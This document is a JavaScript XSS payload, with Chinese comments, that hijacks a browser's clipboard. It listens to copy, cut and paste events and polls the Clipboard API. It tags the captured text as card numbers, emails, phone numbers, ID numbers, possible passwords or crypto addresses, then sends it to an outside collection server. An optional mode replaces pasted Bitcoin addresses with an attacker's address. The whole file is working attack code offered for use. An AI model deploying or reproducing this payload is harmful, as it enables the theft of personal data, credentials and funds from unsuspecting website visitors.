// 剪贴板劫持Payload - 黑客仓库XSS平台
// 监听并窃取用户剪贴板内容

(function() {
    'use strict';
    
    var config = {
        serverUrl: 'https://xss.li/api/collect.php',
        pollInterval: 2000, // 轮询间隔
        modifyClipboard: false // 是否修改剪贴板（钓鱼）
    };
    
    var clipboardHistory = [];
    var lastClipboard = '';
    
    console.log('📋 黑客仓库XSS - 剪贴板劫持模块');
    
    // 方法1：监听复制事件
    document.addEventListener('copy', function(e) {
        var selection = window.getSelection().toString();
        if (selection) {
            recordClipboard(selection, 'copy_event');
            console.log('📋 检测到复制:', selection.substring(0, 30));
        }
    });
    
    // 方法2：监听剪切事件
    document.addEventListener('cut', function(e) {
        var selection = window.getSelection().toString();
        if (selection) {
            recordClipboard(selection, 'cut_event');
            console.log('✂️ 检测到剪切:', selection.substring(0, 30));
        }
    });
    
    // 方法3：监听粘贴事件
    document.addEventListener('paste', async function(e) {
        var pastedText = '';
        
        if (e.clipboardData) {
            pastedText = e.clipboardData.getData('text/plain');
        } else if (window.clipboardData) {
            pastedText = window.clipboardData.getData('Text');
        }
        
        if (pastedText) {
            recordClipboard(pastedText, 'paste_event');
            console.log('📋 检测到粘贴:', pastedText.substring(0, 30));
            
            // 可选：修改粘贴内容（钓鱼攻击）
            if (config.modifyClipboard) {
                // 例如：将比特币地址替换为攻击者地址
                var modifiedText = pastedText;
                
                // 检测比特币地址格式
                if (/^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$/.test(pastedText) || 
                    /^bc1[a-z0-9]{39,59}$/.test(pastedText)) {
                    modifiedText = 'bc1qattackeraddress123456789'; // 替换为攻击者地址
                    console.log('💰 检测到加密货币地址，已替换');
                }
                
                e.preventDefault();
                document.execCommand('insertText', false, modifiedText);
            }
        }
    });
    
    // 方法4：Clipboard API 轮询（需要用户权限）
    async function pollClipboard() {
        if (!navigator.clipboard || !navigator.clipboard.readText) {
            return;
        }
        
        try {
            var text = await navigator.clipboard.readText();
            
            if (text && text !== lastClipboard) {
                lastClipboard = text;
                recordClipboard(text, 'api_poll');
                console.log('📋 轮询检测到新内容');
            }
        } catch (error) {
            // 权限被拒绝或不支持
        }
    }
    
    // 记录剪贴板内容
    function recordClipboard(content, source) {
        var record = {
            content: content,
            source: source,
            length: content.length,
            timestamp: new Date().toISOString(),
            url: window.location.href,
            // 检测敏感信息类型
            type: detectContentType(content)
        };
        
        clipboardHistory.push(record);
        
        // 立即发送敏感内容
        if (record.type !== 'text') {
            sendClipboardData([record]);
        }
        
        // 限制历史记录数量
        if (clipboardHistory.length > 50) {
            clipboardHistory = clipboardHistory.slice(-50);
        }
    }
    
    // 检测内容类型
    function detectContentType(text) {
        // 信用卡
        if (/\b\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4}\b/.test(text)) {
            return 'credit_card';
        }
        // 邮箱
        if (/\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b/.test(text)) {
            return 'email';
        }
        // 电话号码
        if (/\b\d{3}[-.]?\d{3}[-.]?\d{4}\b/.test(text) || /\b\d{11}\b/.test(text)) {
            return 'phone';
        }
        // 身份证号
        if (/\b\d{17}[\dXx]\b/.test(text)) {
            return 'id_card';
        }
        // URL
        if (/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._\+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b/.test(text)) {
            return 'url';
        }
        // 密码（可能）
        if (text.length >= 8 && /[A-Z]/.test(text) && /[a-z]/.test(text) && /\d/.test(text)) {
            return 'possible_password';
        }
        // 加密货币地址
        if (/^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$/.test(text) || /^bc1[a-z0-9]{39,59}$/.test(text)) {
            return 'crypto_address';
        }
        
        return 'text';
    }
    
    // 发送剪贴板数据
    async function sendClipboardData(data) {
        try {
            const response = await fetch(config.serverUrl, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    type: 'clipboard_history',
                    history: data || clipboardHistory,
                    totalRecords: clipboardHistory.length,
                    timestamp: new Date().toISOString()
                })
            });
            
            if (response.ok) {
                console.log('✅ 剪贴板数据已上传');
            }
        } catch (error) {
            console.error('上传失败:', error);
        }
    }
    
    // 启动轮询
    setInterval(pollClipboard, config.pollInterval);
    
    // 定期批量上传
    setInterval(function() {
        if (clipboardHistory.length > 0) {
            sendClipboardData();
        }
    }, 30000); // 30秒上传一次
    
    // 页面卸载前发送
    window.addEventListener('beforeunload', function() {
        if (clipboardHistory.length > 0) {
            navigator.sendBeacon(config.serverUrl, JSON.stringify({
                type: 'clipboard_history',
                history: clipboardHistory
            }));
        }
    });
    
})();
